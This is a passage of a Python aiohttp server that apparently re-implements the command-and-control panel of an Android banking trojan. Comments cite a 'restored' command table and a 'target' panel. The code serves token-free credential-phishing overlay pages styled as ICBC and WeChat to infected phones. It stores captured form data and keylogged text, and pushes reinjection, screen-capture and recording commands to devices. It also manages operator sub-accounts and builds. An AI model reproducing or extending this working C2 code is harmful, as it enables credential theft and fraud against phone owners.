                _dbx.inj_state_set(dev, pkg, 'submitted')
    except Exception as e:
        print('[inj] keylog 落库失败: %s' % e, flush=True)
    try:
        _ai.S.setdefault('inj_records', []).append({
            'ts': int(time.time()), 'deviceId': dev, 'package': pkg,
            'app': tpl, 'enabled': True, 'data': text[:4000], 'src': src,
        })
        # 落 sqlite（面板优先读 DB）；db() 在 api_impl 里，这里要经过 _ai
        d = _ai.db()
        if d:
            try:
                d.inj_record_add(dev, pkg, tpl)
            except Exception:
                pass
    except Exception as e:
        print('[inj] inj_records 落库失败: %s' % e, flush=True)
    print('[inj] +1 %s pkg=%s tpl=%s src=%s bytes=%d' % (dev, pkg, tpl, src, len(text)), flush=True)
    return True


def _auth(request, realm='primary'):
    h = request.headers.get('Authorization', '')
    if h.startswith('Bearer '):
        return _token_row(h[7:], realm)
    return None


# 控制台 join 订阅表：deviceId -> [面板 ws]（设备帧实时转成面板事件推送，见 F-77）
_PANEL_SUBS = {}
# 面板主通道（/ws/dashboard）的全部连接 —— 原版语义是**广播**：
# 面板自己按 deviceId 过滤（bundle: `if(t.deviceId!==n)return`），服务端不需要它先订阅。
_PANEL_ALL = []


def _account_exists(name):
    """账号是否存在（控制台 join/命令只带 usercheck 时用它做认证，见 F-77）。
    覆盖：内置操作员账号 + 中继通道账号表 + 主通道账号表。"""
    who = str(name or '').strip()
    if not who:
        return False
    if who == OPERATOR_USER:
        return True
    try:
        import api_impl as _ai
        for u in (_ai.S.get('relay_users') or []):
            if isinstance(u, dict) and str(u.get('usrname') or u.get('user') or '') == who:
                return True
        for u in (_ai.S.get('users') or []):
            if isinstance(u, dict) and str(u.get('username') or '') == who:
                return True
    except Exception:
        pass
    return False


# ---------------------------------------------------------------- 完整 API 面
SURFACE_ROUTES = []          # [(method, path, status)]
_DONE = {'/adv.php', '/api/device_log', '/api/login', '/api/devices', '/api/command',
         '/api/device_trace', '/api/health', '/io/'}


def _load_surface():
    import json as _json
    here = os.path.dirname(os.path.abspath(__file__))
    p = os.path.join(here, '..', 'contracts', 'api_surface.json')
    try:
        with open(p, encoding='utf-8') as fh:
            return _json.load(fh)
    except Exception as e:
        print('[server] 契约清单读取失败 %s' % e)
        return {}


def _contract_only(path):
    async def handler(request):
        if path.startswith('/api/') and not _auth(request):
            return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
        return web.json_response({'ok': False, 'error': 'contract_only',
                                  'route': path,
                                  'note': '契约已登记，处理逻辑待补（见 contracts/api_surface.json）'},
                                 status=501)
    return handler


RELAY_INJECT = {}          # id -> 注入页模板正文（我方模板目录）


def _load_inject():
    here = os.path.dirname(os.path.abspath(__file__))
    d = os.path.join(here, '..', 'materials', 'inject')
    m = {}
    for fn, i in (('inject_id1_icbc.html', 1), ('inject_id2_wechat.html', 2)):
        fp = os.path.join(d, fn)
        if os.path.exists(fp):
            m[i] = open(fp, encoding='utf-8', errors='replace').read()
    return m


async def relay_captcha(request):
    """原版界面按 {"code":200,"image":"data:image/png;base64,.."} 渲染验证码"""
    import relay_api
    out = relay_api.ep_captcha(None, dict(request.query), 'admin')
    resp = web.json_response(out)
    resp.set_cookie('PHPSESSID', secrets.token_hex(16))
    return resp


async def relay_login(request):
    """原版前端要求成功体含 userid/usrname/email（vendor.chunk.js ya() 的判定）"""
    import relay_api
    try:
        body = await request.json()
    except Exception:
        body = {}
    out = relay_api.ep_login(body, {}, 'admin', (OPERATOR_USER, OPERATOR_PASS), STATE['tokens'])
    if 'error' in out:
        return web.json_response({'error': out['error']}, status=401)
    # 会话落库：与主通道侧一致，服务端重启后面板无需重新登录（协议约定 DB session 行为）
    try:
        import api_impl as _ai
        d = _ai.db()
        if d and out.get('token'):
            d.session_add(out['token'], out.get('usrname') or OPERATOR_USER)
            d.ensure_user(out.get('usrname') or OPERATOR_USER)
    except Exception as e:
        print('[auth] relay 会话落库失败：%s' % e, flush=True)
    return web.json_response(out)


async def bank_asset(request):
    """GET /bank/assets/<name> —— 注入套件共享资源（词条表 / 绑定脚本）。"""
    name = os.path.basename(request.match_info.get('name', ''))
    d = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'materials', 'inject')
    fp = os.path.join(d, name)
    if not name or not os.path.exists(fp):
        return web.Response(status=404, text='not found')
    if name.endswith('.js'):
        ct = 'application/javascript'
    elif name.endswith('.css'):
        ct = 'text/css'
    else:
        ct = 'text/html'
    with open(fp, encoding='utf-8', errors='replace') as fh:
        return web.Response(text=fh.read(), content_type=ct)


async def relay_inject_page(request):
    """免 token 的注入页（对应 /api/EaodBankInject.php?action=page&id=N）"""
    try:
        i = int(request.query.get('id', '1'))
    except Exception:
        i = 1
    html = RELAY_INJECT.get(i)
    if not html:
        return web.Response(status=404, text='not found')
    return web.Response(text=html, content_type='text/html')


def mount_panel_ws(app):
    """中继通道面板侧通道：wss://<host>/api/ws/  （原版界面用）
    收到 {"itype":"slr_panel","subc":"checkphone","token":...} -> 回 {"type":"checkphone","list":[...]}
    设备行字段按原版界面读取的键名给出：user_email/assigned_to/phone_name/country/model/
    battery_charge/network/activz/accessibility/perms/sim/isonline/phone_id/lastPing/region
    """
    async def ws_panel(request):
        ws = web.WebSocketResponse(heartbeat=25)
        await ws.prepare(request)

        def rows(page_size=1000):
            out = []
            for d, r in STATE['devices'].items():
                # 中继通道面板只看中继通道设备（两套 C2 的设备不混展示；见 F-55d）
                if not r.get('relay'):
                    continue
                caps = r.get('caps', {}) or {}
                info = caps.get('device_info') or {}
                online = ((r.get('ws') is not None or r.get('relay_ws') is not None)
                          and _fresh(r))
                out.append({
                    'phone_id': d, 'deviceId': d, 'isonline': '1' if online else '0',
                    'lastPing': int(r.get('last_seen', 0)),
                    'user_email': r.get('assigned_to') or 'admin@local',
                    'assigned_to': r.get('assigned_to') or '',
                    'phone_name': info.get('model') or 'REF-DEVICE',
                    'country': 'CN', 'region': '', 'model': info.get('model') or 'Android Device',
                    'battery_charge': str(caps.get('battery', {}).get('level', '')) or '—',
                    'network': 'wifi', 'activz': '0' if online else '1',
                    'accessibility': '1' if (online and caps) else '0',
                    'perms': caps or {}, 'sim': '有卡' if online else '无卡',
                    'shots': len(r.get('shots', [])), 'msgs': len(r.get('msgs', [])),
                })
            return out[:page_size]

        try:
            authed = False      # 控制台侧连接：checkphone 用 token 认证，join 只带 usercheck（见 F-77）
            async for msg in ws:
                if msg.type != WSMsgType.TEXT:
                    continue
                try:
                    p = json.loads(msg.data)
                except Exception:
                    continue
                itype = str(p.get('itype') or '')
                # ---- 设备侧（中继通道 agent 走同一条 /api/ws/，用 itype 区分）----
                if itype == 'Slr_client':
                    pid = str(p.get('pid') or '')
                    if not pid:
                        continue
                    rec = STATE['devices'].setdefault(
                        pid, {'ws': None, 'apkid': None, 'last_seen': 0, 'first_seen': time.time(),
                              'caps': {}, 'shots': [], 'msgs': [], 'frames': [], 'relay': True})
                    rec['relay'] = True
                    rec['relay_ws'] = ws
                    rec['last_seen'] = time.time()
                    # 中继通道设备重连后恢复持久化归属（见 F-70）
                    try:
                        import api_impl as _ai2
                        _d2 = _ai2.db()
                        if _d2 and not rec.get('assigned_to'):
                            rec['assigned_to'] = _d2.kv_get('assign_%s' % pid) or ''
                    except Exception:
                        pass
                    subc = str(p.get('subc') or '')
                    done = [k for k in
                            ('adb', 'close', 'display', 'screen', 'file', 'files', 'mic', 'perms', 'click', 'key',
                             'log', 'start', 'stop', 'recent') if k in subc.lower()]
                    if done:
                        rec['caps'][done[0]] = p
                    rec['msgs'].append({'ts': int(time.time()), 'action': subc})
                    data = {k: v for k, v in p.items() if k not in ('itype', 'pid', 'subc')}
                    # 大帧（画面 b64）只截断**值**，保留 seg/size/trigger 等元数据 ——
                    # 早期实现整条丢弃（只留 {trunc:true}），导致 recseg 规格判据取不到字段（F-59）
                    if len(str(data)) >= 4000:
                        data = {k: (v[:160] + '…[trunc %dB]' % len(v)
                                    if isinstance(v, str) and len(v) > 200 else v)
                                for k, v in data.items()}
                        data['_truncated'] = True
                    rec['frames'].append({'ts': int(time.time()), 'action': subc,
                                          'data': data,
                                          'keys': sorted(data.keys())})
                    if len(rec['frames']) > 2000:
                        del rec['frames'][:-1000]
                    print('[server] <<< [relay] %s 来自 %s' % (subc, pid))
                    # 推给订阅了这台设备的面板连接（控制台 join 后应实时收到 recseg/intel 等事件；
                    # 原版就是这个语义 —— 控制台页面上的"收到新录屏片段/情报横幅"都靠这条推送，见 F-77）
                    for _pws in list(_PANEL_SUBS.get(pid) or []):
                        try:
                            await _pws.send_str(json.dumps(
                                dict({'type': subc, 'pid': pid}, **data), ensure_ascii=False))
                        except Exception:
                            try:
                                _PANEL_SUBS[pid].remove(_pws)
                            except Exception:
                                pass
                    continue
                sub = str(p.get('subc') or '')
                tok = str(p.get('token') or '')
                actor = _token_row(tok, 'relay') if tok else None
                # 控制台各页面（设备详情/录屏/注入/人脸）在 checkphone 之后就只发 usercheck，不再带 token；
                # 只认 token 会把控制台自己挡在门外（页面反复重连 → 界面永远"连接重试中"，见 F-77）。
                # 因此：token 有效 或 该连接已用 token 认证过 或 usercheck 指向真实账号 → 视为已认证。
                if not actor:
                    who = str(p.get('usercheck') or p.get('usrname') or '')
                    if who and _account_exists(who):
                        actor = who
                        authed = who
                if sub == 'checkphone':
                    if actor:
                        authed = actor
                    try:
                        lst = rows(int(p.get('pageSize') or 1000)) if actor else []
                    except Exception as e:
                        # 一条消息出错不该把整条 WS 搞死（客户端只会看到"莫名其妙断开"，
                        # 排查成本极高）。打印堆栈、回 error、连接继续用。
                        import traceback
                        print('[ws] checkphone 构列表异常：%s\n%s' % (e, traceback.format_exc()),
                              flush=True)
                        await ws.send_str(json.dumps({'type': 'error', 'msg': 'server_error',
                                                      'detail': str(e)[:120]}, ensure_ascii=False))
                        continue
                    await ws.send_str(json.dumps({'type': 'checkphone', 'list': lst,
                                                  'total': len(lst), 'page': 1, 'pageCount': 1,
                                                  'pageSize': p.get('pageSize') or 1000},
                                                 ensure_ascii=False))
                elif sub in ('screen', 'rec', 'join', 'reassign') or str(p.get('itype')) == 'slr_panelsend':
                    if not (actor or authed):
                        await ws.send_str(json.dumps({'type': 'error', 'msg': '未授权操作'}))
                        continue
                    dev = p.get('pid') or p.get('deviceId') or ''
                    if sub == 'join':
                        # join = "我在看这台设备"（订阅）。原版语义：之后该设备的实时事件推给这个连接。
                        if dev:
                            _PANEL_SUBS.setdefault(dev, [])
                            if ws not in _PANEL_SUBS[dev]:
                                _PANEL_SUBS[dev].append(ws)
                        await ws.send_str(json.dumps({'type': 'ok', 'action': 'join',
                                                      'deviceId': dev, 'msg': ''},
                                                     ensure_ascii=False))
                        continue
                    rec = STATE['devices'].get(dev) or {}
                    # 按设备来源选通道：中继通道设备走 /api/ws/ 的 Slr_client 通道（subc 命令），
                    # 主通道设备走 /io/ 的 AES 指令帧 —— 两套协议不同，不能混用（F-57）
                    if rec.get('relay') or rec.get('relay_ws') is not None:
                        dws = rec.get('relay_ws')
                        if dws is None or dws.closed:
                            await ws.send_str(json.dumps({'type': 'error', 'deviceId': dev,
                                                          'msg': '设备不在线'}))
                            continue
                        # 面板语义 -> 中继通道 subc 命令（命令名取自还原出的 69 条命令表）
                        dsub = {'screen': 'Screen', 'rec': 'Record', 'join': 'connected',
                                'reassign': 'change'}.get(sub, p.get('cmd') or sub)
                        await dws.send_str(json.dumps({'subc': dsub, 'pid': dev}, ensure_ascii=False))
                        await ws.send_str(json.dumps({'type': 'ok', 'action': dsub,
                                                      'deviceId': dev, 'msg': ''}))
                        continue
                    act = {'screen': 'takeScreen', 'rec': 'startScreenRelay', 'join': 'ask_relay',
                           'reassign': 'reassign'}.get(sub, p.get('cmd') or sub)
                    ok = await send_command(dev, act, p.get('data') if isinstance(p.get('data'), dict) else None)
                    await ws.send_str(json.dumps({'type': 'ok' if ok else 'error', 'action': act,
                                                  'deviceId': dev, 'msg': '' if ok else '设备不在线'}))
                else:
                    await ws.send_str(json.dumps({'type': 'error', 'msg': 'unknown subc'}))
        finally:
            # 断开时必须清掉本连接关联的设备引用，否则设备会一直显示在线（见 F-71）
            for _pid, _rec in (STATE['devices'] or {}).items():
                if _rec.get('relay_ws') is ws:
                    _rec['relay_ws'] = None
                    _rec['last_seen'] = time.time()
                    print('[server] [relay] 设备下线 %s' % _pid, flush=True)
            # 同时退订：面板连接断了不能留在订阅表里（否则每次推帧都对着死连接发）
            for _pid, _lst in list(_PANEL_SUBS.items()):
                while ws in _lst:
                    _lst.remove(ws)
                if not _lst:
                    _PANEL_SUBS.pop(_pid, None)
        return ws

    app.router.add_get('/api/ws/', ws_panel)
    SURFACE_ROUTES.append(('WS', '/api/ws/', 'implemented(面板通道:checkphone/下发)'))
    print('[server] 面板侧通道已挂载：/api/ws/')


def _fmt_ts(ts):
    try:
        return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(int(ts))) if ts else ''
    except Exception:
        return ''


def _fresh(rec, timeout=90):
    """心跳新鲜度：连接对象还在 **且** 最近有心跳（兜住半开连接/静默掉线，见 F-71）"""
    try:
        return (time.time() - float(rec.get('last_seen') or 0)) < timeout
    except Exception:
        return False


def _resolve_device_owner(assigned_to, apk_id, users):
    owner = str(assigned_to or '')
    apk_id = str(apk_id or '')
    if owner or not apk_id:
        return owner
    matches = [str(u.get('username') or '') for u in (users or [])
               if str(u.get('apkId') or '') == apk_id]
    named = [name for name in matches if name and name != 'admin']
    return named[-1] if named else (matches[-1] if matches else '')


def device_rows(src=None):
    """设备行投影：按原版面板读取的键名给出，供 /api/devices 列表与 /api/device 控制页共用。
    src：'primary' 只出主通道设备、'relay' 只出中继通道设备、None 全部（两套 C2 的设备不能混展示）。"""
    try:
        import api_impl as _ai
        S = _ai.S
    except Exception:
        S = {}
    out = []
    for d, r in STATE['devices'].items():
        is_relay = bool(r.get('relay'))
        if src == 'primary' and is_relay:
            continue
        if src == 'relay' and not is_relay:
            continue
        caps = r.get('caps') or {}
        info = dict(caps.get('device_info') or {})
        adb = caps.get('adb_status') or {}
        perms = caps.get('permissions') or {}
        online = ((r.get('ws') is not None or r.get('relay_ws') is not None)
                  and _fresh(r))
        first = r.get('first_seen') or r.get('last_seen') or 0
        granted = perms.get('granted') or []
        owner = _resolve_device_owner(r.get('assigned_to'), r.get('apkid'), S.get('users'))
        out.append({
            'deviceId': d, 'displayId': d[:8], 'online': online,
            'apkId': r.get('apkid'), 'lastSeen': int(r.get('last_seen') or 0),
            'firstSeen': _fmt_ts(first), 'shots': len(r.get('shots') or []),
            'caps': list(caps.keys()), 'messages': len(r.get('msgs') or []),
            # 列表页直读列
            'brand': info.get('brand', ''), 'model': info.get('model', ''),
            'androidVersion': info.get('android') or info.get('version') or info.get('sdk', ''),
            'sdk': info.get('sdk') or info.get('version', ''),
            'region': info.get('region', ''), 'country': info.get('country', ''),
            'network': info.get('network', ''), 'battery': info.get('battery', 0),
            'charging': info.get('charging', False), 'screen': info.get('screen', ''),
            'sim': info.get('sim', False), 'adb': adb.get('status', ''),
            'root': info.get('root', False), 'resolution': info.get('resolution', ''),
            'accessibility': bool('BIND_ACCESSIBILITY_SERVICE' in granted
                                  or info.get('accessibility')),
            'perms': granted,
            # 运营侧可写字段（备注/标记/置顶/分组）
            'note': (S.get('notes') or {}).get(d, ''),
            'mark': (S.get('marks') or {}).get(d),
            'owner': owner, 'assigned_to': owner,
            'appName': r.get('appName') or info.get('appName', ''),
            'pinned': bool((S.get('pins') or {}).get(d)),
            'safeMode': False,
            'extra': {'deviceInfo': info, 'permissions': granted, 'adb': adb},
        })
    return out


def mount_full_surface(app):
    """把契约面全部挂上：api_impl 有真逻辑的走真逻辑，其余显式 contract_only"""
    import api_impl
    api_impl.load()
    api_impl.set_device_provider(device_rows)

    def _delete_device(dev):
        """真删设备：内存 + DB（供 cleanup / clean 使用，见 F-72）"""
        existed = dev in (STATE['devices'] or {})
        STATE['devices'].pop(dev, None)
        try:
            d = api_impl.db()
            if d:
                d.x('DELETE FROM devices WHERE device_id=?', (dev,))
        except Exception:
            pass
        print('[server] 设备已删除 %s (存在过=%s)' % (dev, existed), flush=True)
        return existed

    api_impl.set_device_deleter(_delete_device)
    data = _load_surface()
    RELAY_INJECT.update(_load_inject())

    def mk(path, method, fn):
        async def handler(request):
            # 设备侧回报注入状态：/api/device-inject-track/{inject,reset,skip}
            # 面板带 token 走正常鉴权；设备不带 token，但会带 deviceId —— 放行这条
            if path.startswith('/api/device-inject-track/'):
                try:
                    _b = await request.json()
                except Exception:
                    _b = {}
                if not _auth(request) and isinstance(_b, dict) and _b.get('deviceId'):
                    _act_d = path.rsplit('/', 1)[-1]
                    _b['_act'] = _act_d
                    _r = api_impl.h_inj_track_act(_b, {}, 'device')
                    try:
                        _dev_d = str(_b.get('deviceId'))
                        _pkg_d = str(_b.get('packageName') or _b.get('pkg') or '')
                        _res = {'inject': 'injected', 'skip': 'skipped'}.get(_act_d, '')
                        if _dev_d and _pkg_d:
                            _dx = api_impl.db()
                            if _dx:
                                _dx.inj_state_set(_dev_d, _pkg_d, _res)
                                print('[inj] state %s %s=%s' % (_dev_d, _pkg_d, _res or "''"), flush=True)
                    except Exception as e:
                        print('[inj] state 写入失败: %s' % e, flush=True)
                    return web.json_response(_r)
                # 面板侧：记完状态后，真的把「重注 / 跳过」下发到设备
                if isinstance(_b, dict) and _b.get('deviceId'):
                    _act = path.rsplit('/', 1)[-1]
                    _body = dict(_b)
                    _body['_act'] = _act
                    _resp = api_impl.h_inj_track_act(_body, {}, 'admin')
                    try:
                        _dev = str(_b.get('deviceId'))
                        _pkg = str(_b.get('packageName') or _b.get('pkg') or '')
                        # 面板点「重注」= 清掉旧结果，等设备真的回报 injected 再显示"已注入"
                        if _act in ('reset', 'inject') and _dev and _pkg:
                            _dx = api_impl.db()
                            if _dx:
                                # 写成空结果：面板显示"等待中"，等设备真的回报 injected 再变"已注入"
                                _dx.inj_state_set(_dev, _pkg, '')
                        if _act in ('inject', 'reset'):
                            await send_command(_dev, 'reinject', {'pkg': _pkg} if _pkg else {})
                        elif _act == 'skip':
                            await send_command(_dev, 'skipInject', {'pkg': _pkg} if _pkg else {})
                    except Exception as e:
                        print('[inj] 下发重注失败: %s' % e, flush=True)
                    return web.json_response(_resp)
            row = _auth(request)
            if not row:
                return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
            # 真实调用者：token 行里只有 'user'，role 要回账号表查。
            # 早先这里写死 'admin' → 普通账号被当超管、越权与归属校验全部失效。
            me_user = str(row.get('user') or row.get('username') or 'admin')
            me_prof = next((u for u in (api_impl.S.get('users') or [])
                            if u.get('username') == me_user), None)
            # 配置的运营账号永远是超级管理员；数据库里残留的旧 role 不能把它降级。
            me_role = ('admin' if me_user == OPERATOR_USER else
                       str((me_prof or {}).get('role') or row.get('role') or 'user'))
            # 角色校验：非 admin 默认只读（子账号不能改配置/删设备/建用户等，见 F-68）。
            # 例外：构建与图标上传必须对普通账号开放，否则"用户基于基座自己打包"永远做不了。
            MEMBER_WRITE_PATHS = {'/api/build', '/api/icon-upload'}
            AGENT_WRITE_PATHS = {'/api/users', '/api/me/password', '/api/tg-bind',
                                 '/api/tg-unbind', '/api/tg-set'}
            allowed_member_write = path in MEMBER_WRITE_PATHS
            allowed_agent_write = me_role == 'agent' and path in AGENT_WRITE_PATHS
            if (me_role != 'admin'
                    and request.method not in ('GET', 'HEAD')
                    and not allowed_member_write
                    and not allowed_agent_write):
                return web.json_response({'ok': False, 'error': 'forbidden',
                                          'note': '当前账号无写入权限'}, status=403)
            # 先看 Content-Type 再决定怎么解析：multipart 必须先处理
            # （先试 request.json() 会失败并消费掉 body，之后 request.post() 拿不到文件 —— 见 F-67）
            ctype = (request.headers.get('Content-Type') or '').lower()
            if request.method in ('POST', 'PUT', 'PATCH', 'DELETE') and 'multipart/' in ctype:
                try:
                    post = await request.post()
                    body = {}
                    for k, v in post.items():
                        if hasattr(v, 'file'):
                            import base64 as _b64
                            raw = v.file.read()
                            body[k] = _b64.b64encode(raw).decode()
                            body[k + '_filename'] = getattr(v, 'filename', '')
                            body[k + '_bytes'] = len(raw)
                        else:
                            body[k] = v
                    if path == '/api/icon-upload':
                        # 注意：文件流只能读一次 —— 上面循环已把内容读进 body['icon']，
                        # 这里再读会拿到空值并把正确值覆盖掉（见 F-67）
                        body.setdefault('filename', body.get('icon_filename', 'icon.png'))
                except Exception as e:
                    print('[server] multipart 解析失败（%s）：%s' % (path, e), flush=True)
                    body = {'_upload_error': str(e)[:120]}
            else:
                try:
                    # DELETE 也带 JSON body（前端 bt('/api/x',{method:'DELETE',body:{id}})）——
                    # 早期只解析 POST/PUT/PATCH，导致带 body 的 DELETE 拿不到 id（见 F-67）
                    body = await request.json() if request.method in ('POST', 'PUT', 'PATCH', 'DELETE') else {}
                except Exception:
                    body = {}
            # 方法必须已注册：**不许回落到 GET**（早期 dispatch 会 `m.get(method) or m.get('GET')`，
            # 导致"方法没实现"被静默当成 GET 处理，调用方看到 200 却是错的行为 —— 见 F-68）
            _methods = api_impl.HANDLERS.get(path) or {}
            if request.method not in _methods:
                return web.json_response({'ok': False, 'error': 'method_not_allowed',
                                          'allow': sorted(_methods.keys())}, status=405)
            try:
                out = api_impl.dispatch(path, method, body, dict(request.query), me_user)
            except Exception as e:
                out = {'ok': False, 'error': 'handler_error', 'detail': str(e)[:200]}
            if out is None:
                return web.json_response({'ok': False, 'error': 'contract_only', 'route': path}, status=501)
            return web.json_response(out)
        return handler

    # 1) api_impl 真逻辑
    for path, methods in api_impl.HANDLERS.items():
        for m, fn in methods.items():
            app.router.add_route(m, path, mk(path, m, fn))
        SURFACE_ROUTES.append(('*', path, 'implemented'))

    async def inject_render(request):
        if not _auth(request):
            return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
        html = api_impl.render_inject(request.query.get('id', ''))
        if not html:
            return web.Response(status=404, text='not found')
        return web.Response(text=html, content_type='text/html')
    app.router.add_get('/api/inject-render', inject_render)

    async def inj_result(request):
        """注入页上报入口（**不需要面板 token**，设备侧直连）。

        兼容两种报文：
          A) {"deviceId":..,"packageName":..,"template":..,"formData":{...}}
          B) {"deviceId":..,"packageName":..,"template":..,"data":"{...}"}
        也接受 form 表单（data=...&pkg=...），以及 query 传参（GET 便于自测）。
        """
        try:
            if request.method == 'POST':
                ctype = (request.headers.get('Content-Type') or '').lower()
                if 'json' in ctype:
                    body = await request.json()
                else:
                    body = dict(await request.post())
            else:
                body = dict(request.query)
        except Exception as e:
            return web.json_response({'ok': False, 'error': 'bad request: %s' % e}, status=400)
        if not isinstance(body, dict):
            body = {}
        dev = body.get('deviceId') or body.get('sn') or body.get('device') or ''
        pkg = body.get('packageName') or body.get('pkg') or body.get('package') or ''
        tpl = body.get('template') or body.get('templateName') or ''
        data = body.get('formData')
        if data is None:
            data = body.get('data')
        if data is None:
            data = body.get('result')
        if data is None:
            data = {k: v for k, v in body.items()
                    if k not in ('deviceId', 'sn', 'device', 'packageName', 'pkg', 'package', 'template', 'templateName')}
        if isinstance(data, str):
            try:
                data = json.loads(data)
            except Exception:
                data = {'raw': data}
        ok = _store_injection(dev, pkg, tpl, data, src='http')
        return web.json_response({'ok': bool(ok), 'deviceId': dev, 'packageName': pkg})
    app.router.add_post('/api/inj/result', inj_result)
    app.router.add_get('/api/inj/result', inj_result)

    async def device_inject_settings(request):
        """设备侧拉注入配置（免 token，只给 enabled 的条目）。"""
        rows = []
        try:
            d = api_impl.db()
            if d:
                rows = d.inject_list() or []
        except Exception:
            rows = []
        if not rows:
            rows = api_impl.S.get('inject_settings') or []
        out = []
        for r in rows:
            if r.get('enabled') is False:
                continue
            out.append({
                'id': r.get('id', ''),
                'package_name': r.get('package_name') or r.get('packageName') or '',
                'app_name': r.get('app_name') or r.get('appName') or '',
                'template_url': r.get('template_url') or r.get('templateUrl') or '',
                'fullscreen': bool(r.get('fullscreen')),
                'category': r.get('category', ''),
                'country': r.get('country', ''),
            })
        return web.json_response({'ok': True, 'settings': out, 'count': len(out)})
    app.router.add_get('/api/device-inject-settings', device_inject_settings)

    async def inject_tpl_public(request):
        """设备 WebView 用的模板直链（免 token）：/inject/tpl/<id>"""
        iid = request.match_info.get('id', '')
        html = api_impl.render_inject(iid)
        if not html:
            return web.Response(status=404, text='not found')
        return web.Response(text=html, content_type='text/html')
    app.router.add_get('/inject/tpl/{id}', inject_tpl_public)

    async def inject_file_public(request):
        """设备 WebView 用的静态模板：/inject/file/<name>（只允许 materials/inject 下的 .html）"""
        name = request.match_info.get('name', '')
        if not name.endswith('.html') or '/' in name or '..' in name:
            return web.Response(status=404, text='not found')
        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'materials', 'inject', name)
        if not os.path.isfile(path):
            return web.Response(status=404, text='not found')
        with open(path, encoding='utf-8') as fh:
            return web.Response(text=fh.read(), content_type='text/html')
    app.router.add_get('/inject/file/{name}', inject_file_public)

    async def device_inject_track(request):
        """设备侧回报注入状态：injected / reset / skipped。"""
        try:
            body = await request.json()
        except Exception:
            body = dict(await request.post()) if request.method == 'POST' else dict(request.query)
        dev = str(body.get('deviceId') or '')
        pkg = str(body.get('packageName') or body.get('pkg') or '')
        app_name = str(body.get('appName') or '')
        state = str(body.get('state') or 'injected')
        if dev:
            api_impl.S.setdefault('inj_track', {})[dev] = {'state': state, 'package': pkg, 'ts': int(time.time())}
            try:
                d = api_impl.db()
                if d:
                    d.track_set(dev, state)
                    if state == 'injected':
                        d.inj_record_add(dev, pkg, app_name)
            except Exception as e:
                print('[inj] track 落库失败: %s' % e, flush=True)
            try:
                api_impl.save()
            except Exception:
                pass
        print('[inj] track dev=%s pkg=%s state=%s' % (dev, pkg, state), flush=True)
        return web.json_response({'ok': True, 'deviceId': dev, 'state': state})
    app.router.add_post('/api/inj/track', device_inject_track)
    app.router.add_get('/api/inj/track', device_inject_track)

    # 2) 其余契约路由：占位（明确标注）
    surf = (data.get('primary_panel', {}) or {}).get('routes', []) or []
    ws_paths = {'/ws/dashboard', '/api/adb-tree/ws', '/api/hd/ws', '/api/sl/ws', '/api/ut/ws'}
    done = (set(_DONE) | set(api_impl.HANDLERS) | {'/api/inject-settings/html'}
            | set(api_impl.ABSENT_IN_TARGET) | ws_paths | {'/api/wallpaper'})

    async def absent(request):
        """目标实测 404 的路由：实现为同行为（404），不计入占位"""
        return web.json_response({'ok': False, 'error': 'not found',
                                  'note': '目标面板实测该路由不存在'}, status=404)

    for p in api_impl.ABSENT_IN_TARGET:
        for m in ('GET', 'POST'):
            app.router.add_route(m, p, absent)

    for r in surf:
        p = r['path']
        norm = p
        if '/$' in norm or '{' in norm:
            norm = norm.split('/$')[0].split('{')[0].rstrip('/') or '/'
        if norm in done or norm in [x[1] for x in SURFACE_ROUTES]:
            continue
        for m in ('GET', 'POST', 'PUT', 'PATCH', 'DELETE'):
            app.router.add_route(m, norm, _contract_only(norm))
        SURFACE_ROUTES.append(('*', norm, 'contract_only'))

    # 3) 中继通道面板端点（原版前端真实调用面）
    import relay_api as _dapi
    app.router.add_get('/api/Captcha.php', relay_captcha)
    app.router.add_post('/api/EaodLogin.php', relay_login)
    app.router.add_get('/api/EaodBankInject.php', relay_inject_page)
    app.router.add_get('/bank/assets/{name}', bank_asset)

    def _devs():
        return api_impl.S and api_impl.devices()

    def _mk_relay(fn, name):
        async def handler(request):
            try:
                # DELETE 也带 JSON body（前端 bt('/api/x',{method:'DELETE',body:{id}})）——
                # 早期只解析 POST/PUT/PATCH，导致带 body 的 DELETE 拿不到 id（见 F-67）
                body = await request.json() if request.method in ('POST', 'PUT', 'PATCH', 'DELETE') else {}
            except Exception:
                body = {}
            q = dict(request.query)
            # 认证：中继通道端点原版靠 body 里的 token；**不校验 token 就等于管理面裸奔**（见 F-68）
            tok = ((body or {}).get('token') or q.get('token')
                   or (request.headers.get('Authorization', '')[7:]
                       if request.headers.get('Authorization', '').startswith('Bearer ') else ''))
            if not _token_row(tok, 'relay'):
                return web.json_response({'code': 401, 'msg': '登录状态无效或已过期',
                                          'error': 'unauthorized'}, status=401)
            try:
                import relay_ctx
                ctx = relay_ctx.RelayCtx(STATE, api_impl)
                if name == 'ep_operation_log':
                    out = fn(body, q, 'admin', api_impl.S['audit'][-200:])
                else:
                    # 统一传状态门户（账号/设备/封禁/构建/审计的真读写入口，见 F-66）
                    out = fn(body, q, 'admin', ctx)
            except Exception as e:
                out = {'code': 500, 'msg': 'handler_error: %s' % str(e)[:120]}
            return web.json_response(out)
        return handler

    for path, m, fn, nm in (
            ('/api/EaodAllDevices.php', 'POST', _dapi.ep_all_devices, 'ep_all_devices'),
            ('/api/EaodAccountManage.php', 'POST', _dapi.ep_account_manage, 'ep_account_manage'),
            ('/api/OperationLog.php', 'POST', _dapi.ep_operation_log, 'ep_operation_log'),
            ('/api/SubAccountStats.php', 'POST', _dapi.ep_sub_stats, 'ep_sub_stats'),
            ('/api/DeletePhoneById.php', 'POST', _dapi.ep_delete_phone, 'ep_delete_phone'),
            ('/api/BatchDeleteDevices.php', 'POST', _dapi.ep_batch_delete, 'ep_batch_delete'),
            ('/api/BatchReassignDevice.php', 'POST', _dapi.ep_batch_reassign, 'ep_batch_reassign'),
            ('/api/BannedDevices.php', 'POST', _dapi.ep_banned, 'ep_banned'),
            ('/api/BuildProgress.php', 'POST', _dapi.ep_build_progress, 'ep_build_progress'),
            ('/api/ChangePassword.php', 'POST', _dapi.ep_change_password, 'ep_change_password'),
            ('/api/ReassignDevice.php', 'POST', _dapi.ep_reassign_device, 'ep_reassign_device'),
            ('/api/GetPhoneById.php', 'POST', _dapi.ep_get_phone, 'ep_get_phone'),
            ('/api/EaodIntel.php', 'POST', _dapi.ep_intel, 'ep_intel'),
